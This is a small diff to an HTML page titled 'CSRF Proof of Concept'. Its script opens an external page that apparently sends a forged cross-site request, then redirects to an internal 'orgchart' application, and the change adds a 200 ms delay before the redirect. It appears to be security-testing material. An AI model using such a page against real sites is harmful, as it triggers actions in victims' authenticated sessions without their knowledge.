@@ -7,7 +7,9 @@
     <h1>CSRF Proof of Concept</h1>ard
     <script>
         window.open('https://ardbard.github.io/csrf-request/', '_blank');        
-        window.location.href = 'https://orgchart/index.php';
+        setTimeout(() => {
+            window.location.href = 'https://orgchart/index.php';
+        }, 200);
     </script>
 </body>
 </html>
